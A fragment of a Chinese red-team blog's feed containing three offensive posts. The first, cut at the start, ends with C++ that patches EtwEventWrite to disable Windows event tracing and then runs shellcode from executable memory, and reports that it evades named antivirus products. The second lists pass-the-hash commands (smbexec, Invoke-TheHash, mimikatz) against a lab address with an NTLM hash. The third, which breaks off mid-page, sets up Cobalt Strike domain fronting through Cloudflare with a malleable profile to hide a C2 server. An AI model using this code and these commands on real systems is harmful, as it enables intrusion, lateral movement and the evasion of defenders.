OldAccessProtection);</span><br><span class="line">tNtVirtual oNtVirtual;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">disableETW</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// return 0</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> patch[] = &#123; <span class="number">0x48</span>, <span class="number">0x33</span>, <span class="number">0xc0</span>, <span class="number">0xc3</span> &#125;;     <span class="comment">// xor rax, rax; ret</span></span><br><span class="line"></span><br><span class="line">    ULONG oldprotect = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">size_t</span> <span class="built_in">size</span> = <span class="keyword">sizeof</span>(patch);</span><br><span class="line"></span><br><span class="line">    HANDLE hCurrentProc = GetCurrentProcess();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> sEtwEventWrite[] = &#123; <span class="string">'E'</span>,<span class="string">'t'</span>,<span class="string">'w'</span>,<span class="string">'E'</span>,<span class="string">'v'</span>,<span class="string">'e'</span>,<span class="string">'n'</span>,<span class="string">'t'</span>,<span class="string">'W'</span>,<span class="string">'r'</span>,<span class="string">'i'</span>,<span class="string">'t'</span>,<span class="string">'e'</span>, <span class="number">0x0</span> &#125;;</span><br><span class="line">    <span class="keyword">void</span>* pEventWrite = GetProcAddress(GetModuleHandle(<span class="string">"ntdll.dll"</span>), (LPCSTR)sEtwEventWrite);</span><br><span class="line">    <span class="keyword">if</span> ((DWORD)GetModuleHandle(<span class="string">"ntdll.dll"</span>) == <span class="literal">NULL</span>) &#123; <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"error"</span>; &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"NTDLL.DLL START ADDRESS: %08x"</span>, (DWORD)GetModuleHandle(<span class="string">"ntdll.dll"</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ((DWORD)GetProcAddress(GetModuleHandle(<span class="string">"ntdll.dll"</span>), <span class="string">"NtProtectVirtualMemory"</span>) == <span class="literal">NULL</span>) &#123; <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"error"</span>; &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123; <span class="built_in">printf</span>(<span class="string">"\nNtProtectVirtualMemory ADDRESS: %08x"</span>, (DWORD)GetProcAddress(GetModuleHandle(<span class="string">"ntdll.dll"</span>), <span class="string">"NtProtectVirtualMemory"</span>)); &#125;</span><br><span class="line"></span><br><span class="line">    FARPROC farProc = GetProcAddress(GetModuleHandle(<span class="string">"ntdll.dll"</span>), <span class="string">"NtProtectVirtualMemory"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    oNtVirtual = (tNtVirtual)farProc;</span><br><span class="line">    oNtVirtual(hCurrentProc, &amp;pEventWrite, (PSIZE_T)&amp;<span class="built_in">size</span>, PAGE_READWRITE, &amp;oldprotect);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//memcpy(pEventWrite, patch, size / sizeof(patch[0]));</span></span><br><span class="line">    <span class="built_in">memcpy</span>(pEventWrite, patch, <span class="number">4</span>);</span><br><span class="line">    oNtVirtual(hCurrentProc, &amp;pEventWrite, (PSIZE_T)&amp;<span class="built_in">size</span>, oldprotect, &amp;oldprotect);</span><br><span class="line">    FlushInstructionCache(hCurrentProc, pEventWrite, <span class="built_in">size</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  disableETW();</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span>* exec = VirtualAlloc(<span class="number">0</span>, <span class="keyword">sizeof</span> shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line"><span class="built_in">memcpy</span>(exec, shellcode, <span class="keyword">sizeof</span> shellcode);</span><br><span class="line">((<span class="keyword">void</span>(*)())exec)();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="杀软测试"><a href="#杀软测试" class="headerlink" title="杀软测试"></a>杀软测试</h2><p>最后马子实测配合其他C2可以过卡巴，但是如果用cs的话国产杀软能过，卡巴过不去，卡巴查杀原因是数据库查杀，CS特征被检测到，得从cs特征上修改。</p><p><img src="1.png" alt=""></p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://xz.aliyun.com/t/11448?page=1#toc-11" target="_blank" rel="noopener">红队队开发基础-基础免杀(一)</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;好久没水文章了，最近一段时间一直在忙项目上的事情。= =&lt;/p&gt;</summary>
    
    
    
    <category term="免杀" scheme="https://chenzidu.github.io/categories/%E5%85%8D%E6%9D%80/"/>
    
    
    <category term="C++" scheme="https://chenzidu.github.io/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>SMB_RDP_WMI_hash传递探测_利用</title>
    <link href="https://chenzidu.github.io/2022/06/02/SMB-RDP-WMI-hash%E4%BC%A0%E9%80%92%E6%8E%A2%E6%B5%8B-%E5%88%A9%E7%94%A8/"/>
    <id>https://chenzidu.github.io/2022/06/02/SMB-RDP-WMI-hash%E4%BC%A0%E9%80%92%E6%8E%A2%E6%B5%8B-%E5%88%A9%E7%94%A8/</id>
    <published>2022-06-02T01:41:34.000Z</published>
    <updated>2022-12-11T09:31:21.954Z</updated>
    
    <content type="html"><![CDATA[<h2 id="smb"><a href="#smb" class="headerlink" title="smb"></a>smb</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>&emsp;&emsp;SMB服务大多运行在windows系统上，SMB通信协议协议在网络上的端点之间提供对文件、打印机和串行端口的共享访问。在扫描过程中，我们通常会看到目标上的 445 TCP 端口打开，为 SMB 协议保留。Microsoft SMB 协议是传输层协议最常使用的是基于 TCP/IP (NBT) 的 NetBIOS，正因为如此，它依赖于较低级别的传输协议。这就是为什么在扫描过程中，我们很可能会同时看到具有在目标上运行的开放端口的协议。<br><br>&emsp;&emsp;使用 SMB 协议，应用程序（或应用程序的用户）可以访问远程服务器上的文件，以及打印机等其他资源。 因此，客户端应用程序可以读取、创建和更新文件远程服务器。 它还可以与任何设置为接收 SMB 客户端的服务器程序通信要求。<br><br>&emsp;&emsp;网络上启用 SMB 的存储称为共享。 任何拥有服务器的地址和正确的凭据。 与许多其他文件访问协议一样，SMB 需要一些安全层在网络拓扑中正常运行。 如果 SMB 允许客户端创建、编辑、<br>检索和删除共享上的文件，显然需要一种身份验证机制。 在用户层面，SMB 客户端需要提供用户名/密码组合才能查看内容或与内容交互SMB共享。<br><br>&emsp;&emsp;如果扫描得到目标IP的TCP445开放，为了成功枚举远程系统上的共享内容，我们可以使用一个名为smb客户端。</p><a id="more"></a><h3 id="单IP"><a href="#单IP" class="headerlink" title="单IP"></a>单IP</h3><h4 id="smbexec-hash传递"><a href="#smbexec-hash传递" class="headerlink" title="smbexec_hash传递"></a>smbexec_hash传递</h4><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\smbexec.exe -hashes :<span class="number">973f</span>cd01b987e913cc0209c2f462a751 ./<span class="symbol">administrator@</span><span class="number">192.168</span><span class="number">.1</span><span class="number">.8</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2022/png/2118454/1654062783250-d35fada8-94fe-4ec2-8004-665f809dc04f.png#clientId=u939ddc04-5594-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=692&id=u09f28a6a&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1038&originWidth=1724&originalType=binary&ratio=1&rotation=0&showTitle=false&size=128014&status=done&style=none&taskId=udffff2c3-7bde-47c4-a27f-e473f937928&title=&width=1149.3333333333333" alt="image.png"></p><h4 id="SMBExec-hash探测"><a href="#SMBExec-hash探测" class="headerlink" title="SMBExec_hash探测"></a>SMBExec_hash探测</h4><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-SMBExec -Target <span class="number">192.168</span><span class="number">.1</span><span class="number">.8</span> -Domain DESKTOP-QD1A1VJ -Username administrator -Hash <span class="number">973f</span>cd01b987e913cc0209c2f462a751</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2022/png/2118454/1654066837915-33437c7d-ef61-4e52-97f3-ae823c4cbbd5.png#clientId=u939ddc04-5594-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=55&id=ua98328a9&margin=%5Bobject%20Object%5D&name=image.png&originHeight=82&originWidth=1618&originalType=binary&ratio=1&rotation=0&showTitle=false&size=24562&status=done&style=none&taskId=uc35fe1c4-3465-4def-88eb-7f95b16d7c6&title=&width=1078.6666666666667" alt="image.png"></p><h3 id="网段"><a href="#网段" class="headerlink" title="网段"></a>网段</h3><h4 id="fscan-SMB探测"><a href="#fscan-SMB探测" class="headerlink" title="fscan_SMB探测"></a>fscan_SMB探测</h4><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\fs.exe -h 192.168.1.0/24 -m<span class="built_in"> smb </span>-pwd asd123=</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2022/png/2118454/1654066674718-5375ef86-6171-41e6-adca-2f78f3fca855.png#clientId=u939ddc04-5594-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=454&id=ua6ea3a2d&margin=%5Bobject%20Object%5D&name=image.png&originHeight=681&originWidth=1101&originalType=binary&ratio=1&rotation=0&showTitle=false&size=76007&status=done&style=none&taskId=u6135a004-50ae-43aa-a3b5-7564d19f4cc&title=&width=734" alt="image.png"></p><h4 id="Ps1-hash传递"><a href="#Ps1-hash传递" class="headerlink" title="Ps1_hash传递"></a>Ps1_hash传递</h4><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-TheHash -Type WMIExec -Target <span class="number">192.168</span><span class="number">.1</span><span class="number">.0</span>/<span class="number">24</span> -Domain DESKTOP-QD1A1VJ -Username administrator -Hash <span class="number">973f</span>cd01b987e913cc0209c2f462a751</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2022/png/2118454/1654066475361-5ddea932-19ca-4944-a7d6-8dc0cb3bf9e5.png#clientId=u939ddc04-5594-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=63&id=ub3b799d5&margin=%5Bobject%20Object%5D&name=image.png&originHeight=94&originWidth=1601&originalType=binary&ratio=1&rotation=0&showTitle=false&size=30162&status=done&style=none&taskId=uc4b7af49-776d-4240-9744-f1710c5e47f&title=&width=1067.3333333333333" alt="image.png"></p><h2 id="RDP"><a href="#RDP" class="headerlink" title="RDP"></a>RDP</h2><h3 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h3><p>&emsp;&emsp;远程桌面协议(RDP)是一个多通道(multi-channel)的协议，让使用者(所在计算机称为用户端或’本地计算机’)连上提供微软终端机服务的计算机(称为服务端或’远程计算机’)。</p><h3 id="单IP-1"><a href="#单IP-1" class="headerlink" title="单IP"></a>单IP</h3><h4 id="mimikatz-hash传递"><a href="#mimikatz-hash传递" class="headerlink" title="mimikatz_hash传递"></a>mimikatz_hash传递</h4><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">sekurlsa:</span>:pth <span class="regexp">/user:Administrator /</span><span class="string">domain:</span><span class="number">973</span>fcd01b987e913cc0209c2f462a751 <span class="regexp">/ntlm:973fcd01b987e913cc0209c2f462a751 "/</span><span class="string">run:</span>mstsc.exe /restrictedadmin<span class="string">"</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2022/png/2118454/1654063612363-03fa4c1f-0bf8-434f-8d21-4d324ece3229.png#clientId=u939ddc04-5594-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=480&id=wGxXK&margin=%5Bobject%20Object%5D&name=image.png&originHeight=720&originWidth=1440&originalType=binary&ratio=1&rotation=0&showTitle=false&size=71054&status=done&style=none&taskId=u696f65af-cee5-4750-b7fa-13a0039a1c4&title=&width=960" alt="image.png"></p><h3 id="网段-1"><a href="#网段-1" class="headerlink" title="网段"></a>网段</h3><h4 id="fscan-扫描"><a href="#fscan-扫描" class="headerlink" title="fscan_扫描"></a>fscan_扫描</h4><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\fs.exe -h <span class="number">192.168</span><span class="number">.1</span><span class="number">.0</span>/<span class="number">24</span> -m rdp -pwd asd123=</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2022/png/2118454/1654066642326-95000608-5535-45e9-bbfc-839e1f0daca2.png#clientId=u939ddc04-5594-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=497&id=uac555c22&margin=%5Bobject%20Object%5D&name=image.png&originHeight=746&originWidth=1083&originalType=binary&ratio=1&rotation=0&showTitle=false&size=85491&status=done&style=none&taskId=uf5f2f1a4-57e5-4001-93cb-8e9683a2bdf&title=&width=722" alt="image.png"></p><h2 id="WMI"><a href="#WMI" class="headerlink" title="WMI"></a>WMI</h2><h3 id="介绍-2"><a href="#介绍-2" class="headerlink" title="介绍"></a>介绍</h3><p>&emsp;&emsp;WMI的全名为”Windows Management Instrumentation”。从win8后，Windows操作系统都支持WMI，WMI可以在本地或者远程管理计算机系统。<br><br>&emsp;&emsp;自从PsExec在内网中被严格监控后，越来越多的反病毒厂商将PsExec加入了黑名单，于是乎攻击者转向使用WMI进行横向移动。在渗透时发现，在使用wmiexec进行横向移动时，Windows操作系统默认不会将WMI的操作记录在日志中。因为这个过程不会记录日志，所以对蓝队来说大大增加了溯源的成本。对攻击者来说，被发现的可能性降低，隐蔽性提高。很多APT组织现在都喜欢使用WMI进行攻击。</p><h3 id="单IP-2"><a href="#单IP-2" class="headerlink" title="单IP"></a>单IP</h3><h4 id="WMIExec-hash传递"><a href="#WMIExec-hash传递" class="headerlink" title="WMIExec_hash传递"></a>WMIExec_hash传递</h4><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-WMIExec -Target <span class="number">192.168</span><span class="number">.1</span><span class="number">.8</span> -Domain DESKTOP-QD1A1VJ -Username administrator -Hash <span class="number">973f</span>cd01b987e913cc0209c2f462a751</span><br></pre></td></tr></table></figure><h4 id=""><a href="#" class="headerlink" title=""></a><img src="https://cdn.nlark.com/yuque/0/2022/png/2118454/1654066895951-c8da0db7-1b91-4f33-89e3-4fc7b086dfb4.png#clientId=u939ddc04-5594-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=51&id=ub9b3abc8&margin=%5Bobject%20Object%5D&name=image.png&originHeight=77&originWidth=1595&originalType=binary&ratio=1&rotation=0&showTitle=false&size=22139&status=done&style=none&taskId=uee3ff694-cdd1-45f5-9577-b21e4592706&title=&width=1063.3333333333333" alt="image.png"></h4><h3 id="网段-2"><a href="#网段-2" class="headerlink" title="网段"></a>网段</h3><h4 id="Ps1-hash传递-1"><a href="#Ps1-hash传递-1" class="headerlink" title="Ps1_hash传递"></a>Ps1_hash传递</h4><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-TheHash -Type WMIExec -Target <span class="number">192.168</span><span class="number">.1</span><span class="number">.0</span>/<span class="number">24</span> -Domain DESKTOP-QD1A1VJ -Username administrator -Hash <span class="number">973f</span>cd01b987e913cc0209c2f462a751</span><br></pre></td></tr></table></figure><h2 id="-1"><a href="#-1" class="headerlink" title=""></a><img src="https://cdn.nlark.com/yuque/0/2022/png/2118454/1654066316709-eecd7305-9629-4222-9d7d-6625f0e4e047.png#clientId=u939ddc04-5594-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=69&id=ue4619d3a&margin=%5Bobject%20Object%5D&name=image.png&originHeight=103&originWidth=1600&originalType=binary&ratio=1&rotation=0&showTitle=false&size=30387&status=done&style=none&taskId=u77ff4673-564f-4458-bc6e-df773ce0a5c&title=&width=1066.6666666666667" alt="image.png"></h2><h3 id="超级弱口令检查工具-SMB-RDP"><a href="#超级弱口令检查工具-SMB-RDP" class="headerlink" title="超级弱口令检查工具 SMB/RDP"></a>超级弱口令检查工具 SMB/RDP</h3><p><img src="https://cdn.nlark.com/yuque/0/2022/png/2118454/1654067044438-186b5985-b19a-40a2-bc65-c295c145f39c.png#clientId=u939ddc04-5594-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=701&id=u7a89aa82&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1052&originWidth=1312&originalType=binary&ratio=1&rotation=0&showTitle=false&size=206076&status=done&style=none&taskId=ubf7b89bb-8301-4e59-a6ea-77faab429f9&title=&width=874.6666666666666" alt="image.png"></p><h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><p><a href="https://github.com/Kevin-Robertson/Invoke-TheHash" target="_blank" rel="noopener">https://github.com/Kevin-Robertson/Invoke-TheHash</a><br><a href="https://github.com/shadow1ng/fscan" target="_blank" rel="noopener">https://github.com/shadow1ng/fscan</a><br><a href="https://github.com/SecureAuthCorp/impacket" target="_blank" rel="noopener">https://github.com/SecureAuthCorp/impacket</a><br><a href="https://github.com/shack2/SNETCracker" target="_blank" rel="noopener">https://github.com/shack2/SNETCracker</a><br><a href="https://github.com/gentilkiwi/mimikatz" target="_blank" rel="noopener">https://github.com/gentilkiwi/mimikatz</a></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;smb&quot;&gt;&lt;a href=&quot;#smb&quot; class=&quot;headerlink&quot; title=&quot;smb&quot;&gt;&lt;/a&gt;smb&lt;/h2&gt;&lt;h3 id=&quot;介绍&quot;&gt;&lt;a href=&quot;#介绍&quot; class=&quot;headerlink&quot; title=&quot;介绍&quot;&gt;&lt;/a&gt;介绍&lt;/h3&gt;&lt;p&gt;&amp;emsp;&amp;emsp;SMB服务大多运行在windows系统上，SMB通信协议协议在网络上的端点之间提供对文件、打印机和串行端口的共享访问。在扫描过程中，我们通常会看到目标上的 445 TCP 端口打开，为 SMB 协议保留。Microsoft SMB 协议是传输层协议最常使用的是基于 TCP/IP (NBT) 的 NetBIOS，正因为如此，它依赖于较低级别的传输协议。这就是为什么在扫描过程中，我们很可能会同时看到具有在目标上运行的开放端口的协议。&lt;br&gt;&lt;br&gt;&amp;emsp;&amp;emsp;使用 SMB 协议，应用程序（或应用程序的用户）可以访问远程服务器上的文件，以及打印机等其他资源。 因此，客户端应用程序可以读取、创建和更新文件远程服务器。 它还可以与任何设置为接收 SMB 客户端的服务器程序通信要求。&lt;br&gt;&lt;br&gt;&amp;emsp;&amp;emsp;网络上启用 SMB 的存储称为共享。 任何拥有服务器的地址和正确的凭据。 与许多其他文件访问协议一样，SMB 需要一些安全层在网络拓扑中正常运行。 如果 SMB 允许客户端创建、编辑、&lt;br&gt;检索和删除共享上的文件，显然需要一种身份验证机制。 在用户层面，SMB 客户端需要提供用户名/密码组合才能查看内容或与内容交互SMB共享。&lt;br&gt;&lt;br&gt;&amp;emsp;&amp;emsp;如果扫描得到目标IP的TCP445开放，为了成功枚举远程系统上的共享内容，我们可以使用一个名为smb客户端。&lt;/p&gt;</summary>
    
    
    
    
    <category term="hash传递" scheme="https://chenzidu.github.io/tags/hash%E4%BC%A0%E9%80%92/"/>
    
  </entry>
  
  <entry>
    <title>cobaltstrike域前置</title>
    <link href="https://chenzidu.github.io/2022/05/15/cobaltstrike%E5%9F%9F%E5%89%8D%E7%BD%AE/"/>
    <id>https://chenzidu.github.io/2022/05/15/cobaltstrike%E5%9F%9F%E5%89%8D%E7%BD%AE/</id>
    <published>2022-05-15T01:20:47.000Z</published>
    <updated>2022-12-11T09:31:21.954Z</updated>
    
    <content type="html"><![CDATA[<h2 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h2><p>CS的流量特征是很明显的，如果蓝队成员在流量中发现了相关特征那么基本也就宣告了个权限的丢失，而且还有可能被疏远反制。正因为CS的流量的特征太明显，所以需要对CS进行一些修改和对VPS的地址进行保护，尽可以降低被发现后造成权限丢失和被溯源反制的事情发生概率，加大蓝队的疏远难度。<br>主要思路</p><a id="more"></a><h2 id="主要思路与配置"><a href="#主要思路与配置" class="headerlink" title="主要思路与配置"></a>主要思路与配置</h2><p>● 免费tk域名<br>● cloudflare<br>● 云服务器<br>通过 匿名域名-&gt;CDN-&gt;VPS，在这个过程中来隐藏我们的真实IP，达到套了CDN，找不到服务器真实ip的情况。</p><h3 id="达到的效果"><a href="#达到的效果" class="headerlink" title="达到的效果"></a>达到的效果</h3><p>● 受害者主机运行木马—–&gt;CDN—-&gt;CS服务器收到上线<br>● CS服务器执行命令—–&gt;CDN—–&gt;受害者主机执行命令</p><h2 id="申请域名"><a href="#申请域名" class="headerlink" title="申请域名"></a>申请域名</h2><p>&nbsp;&nbsp;我们选用<a href="https://www.freenom.com/zh/index.html?lang=zh" target="_blank" rel="noopener">freenom.com</a>去申请一个免费的域名。</p><p><img src="1.png" alt=""></p><p>&nbsp;&nbsp;这边建议直接输出域名包括后缀，否则可能显示不可用，例如：xxx.tk</p><p>成功注册后，先去弄一个cloudflare账号，将注册的域名添加进去。</p><p><img src="2.png" alt=""></p><h2 id="关联Cloudflare"><a href="#关联Cloudflare" class="headerlink" title="关联Cloudflare"></a>关联Cloudflare</h2><p>&nbsp;&nbsp;将freenom中申请的域名，在管理界面中DNS解析改cloudflare提供的DNS</p><p><img src="3.png" alt=""></p><p>&nbsp;&nbsp;在DNS的子模块中找到属于你的DNS服务器，填入freenom管理台中Management tools-&gt;Nameservers</p><p><img src="4.png" alt=""></p><p>&nbsp;&nbsp;选择第二个，填入你的Cloudflare DNS</p><p><img src="5.png" alt=""></p><h2 id="Cloudflare配置"><a href="#Cloudflare配置" class="headerlink" title="Cloudflare配置"></a>Cloudflare配置</h2><h3 id="缓存设置"><a href="#缓存设置" class="headerlink" title="缓存设置"></a>缓存设置</h3><p>接下来在Cloudflare中进行设置，首先在概述-&gt;快速设置</p><p><img src="6.png" alt=""></p><p>这边都要关闭，设置完之后看一下Summary，是不是都关闭了</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Automatic HTTPS Rewrites: <span class="keyword">OFF</span></span><br><span class="line"><span class="keyword">Always</span> use HTTPS: <span class="keyword">OFF</span></span><br><span class="line">Auto Minify: <span class="keyword">NONE</span></span><br><span class="line">Brotli: <span class="keyword">OFF</span></span><br></pre></td></tr></table></figure><p><img src="7.png" alt=""></p><p>&nbsp;&nbsp;找到Caching -&gt; Configuration在其中开启Always Online以及Development Mode,经过实验，配置好之后Development Mode模式不用开启也可以，需要在规则上面配置</p><p><img src="8.png" alt=""></p><h3 id="规则配置"><a href="#规则配置" class="headerlink" title="规则配置"></a>规则配置</h3><p>在Rules-&gt;Page Rules 页面设置，什么路径走代理，什么路径不走代理。个人测试配置完后可以不开Development Mode</p><p><img src="Rules.png" alt=""></p><h2 id="CS配置"><a href="#CS配置" class="headerlink" title="CS配置"></a>CS配置</h2><h3 id="证书配置"><a href="#证书配置" class="headerlink" title="证书配置"></a>证书配置</h3><p>在SSL/TLS -&gt;Overview 修改为Full即可</p><p><img src="9.png" alt=""></p><p>再到Origin Server页面下创建证书</p><p><img src="10.png" alt=""><br>保存我们的pem和key文件（命名为xxx.tk.pem、xxx.tk.key），在服务器cs同文件夹下放置，并且如下执行命令</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">openssl</span> <span class="selector-tag">pkcs12</span> <span class="selector-tag">-export</span> <span class="selector-tag">-in</span> <span class="selector-tag">xxx</span><span class="selector-class">.tk</span><span class="selector-class">.pem</span> <span class="selector-tag">-inkey</span> <span class="selector-tag">update</span><span class="selector-class">.xxx</span><span class="selector-class">.tk</span><span class="selector-class">.key</span> <span class="selector-tag">-out</span> <span class="selector-tag">xxx</span><span class="selector-class">.tk</span><span class="selector-class">.p12</span> <span class="selector-tag">-name</span> <span class="selector-tag">xxx</span><span class="selector-class">.tk</span> <span class="selector-tag">-passout</span> <span class="selector-tag">pass</span><span class="selector-pseudo">:123456</span></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">keytool</span> <span class="selector-tag">-importkeystore</span> <span class="selector-tag">-deststorepass</span> 123456 <span class="selector-tag">-destkeypass</span> 123456 <span class="selector-tag">-destkeystore</span> <span class="selector-tag">xxx</span><span class="selector-class">.tk</span><span class="selector-class">.store</span> <span class="selector-tag">-srckeystore</span> <span class="selector-tag">xxx</span><span class="selector-class">.tk</span><span class="selector-class">.p12</span> <span class="selector-tag">-srcstoretype</span> <span class="selector-tag">PKCS12</span> <span class="selector-tag">-srcstorepass</span> 123456 <span class="selector-tag">-alias</span> <span class="selector-tag">xxx</span><span class="selector-class">.tk</span></span><br></pre></td></tr></table></figure><p>最后会生成一个xxx.tk.store文件，上面的xxx.tk就是你的申请的域名。其中文件有个坑，cs的store的默认密码是123456所以我这边都保持一致免得出错。</p><h3 id="profile编写"><a href="#profile编写" class="headerlink" title="profile编写"></a>profile编写</h3><p>在cs同目录下编写文件cs.profile，这边写个最简单的。将里面xxx.tk替换成你的域名即可</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">https-certificate &#123;</span><br><span class="line">    <span class="builtin-name">set</span> keystore <span class="string">"xxx.tk.store.store"</span>;</span><br><span class="line">    <span class="builtin-name">set</span> password <span class="string">"123456"</span>;</span><br><span class="line">&#125;</span><br><span class="line">http-stager &#123;</span><br><span class="line">    <span class="builtin-name">set</span> uri_x86 <span class="string">"/api/1"</span>;</span><br><span class="line">    <span class="builtin-name">set</span> uri_x64 <span class="string">"/api/2"</span>;</span><br><span class="line">   <span class="built_in"> client </span>&#123;</span><br><span class="line">        header <span class="string">"Host"</span> <span class="string">"xxx.tk"</span>;&#125;</span><br><span class="line">   <span class="built_in"> server </span>&#123;</span><br><span class="line">        output&#123;</span><br><span class="line">        print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">        &#125;</span><br><span class="line">http-<span class="builtin-name">get</span> &#123;</span><br><span class="line">    <span class="builtin-name">set</span> uri <span class="string">"/api/3"</span>;</span><br><span class="line">   <span class="built_in"> client </span>&#123;</span><br><span class="line">        header <span class="string">"Host"</span> <span class="string">"xxx.tk"</span>;</span><br><span class="line">        metadata &#123;</span><br><span class="line">            base64;</span><br><span class="line">            header <span class="string">"Cookie"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line">   <span class="built_in"> server </span>&#123;</span><br><span class="line">        output&#123;</span><br><span class="line">        print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">        &#125;</span><br><span class="line">http-post &#123;</span><br><span class="line">    <span class="builtin-name">set</span> uri <span class="string">"/api/4"</span>;</span><br><span class="line">   <span class="built_in"> client </span>&#123;</span><br><span class="line">        header <span class="string">"Host"</span> <span class="string">"xxx.tk"</span>;</span><br><span class="line">        id &#123;</span><br><span class="line">            uri-append;</span><br><span class="line">        &#125;</span><br><span class="line">        output&#123;</span><br><span class="line">        print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">   <span class="built_in"> server </span>&#123;</span><br><span class="line">        output&#123;</span><br><span class="line">        print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编写好后利用CS自带的c2lint来测试可用性，同目录下执行命令</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./c2lint <span class="keyword">cs</span>.<span class="keyword">profile</span></span><br></pre></td></tr></table></figure><p><img src="11.png" alt=""></p><h3 id="修改证书"><a href="#修改证书" class="headerlink" 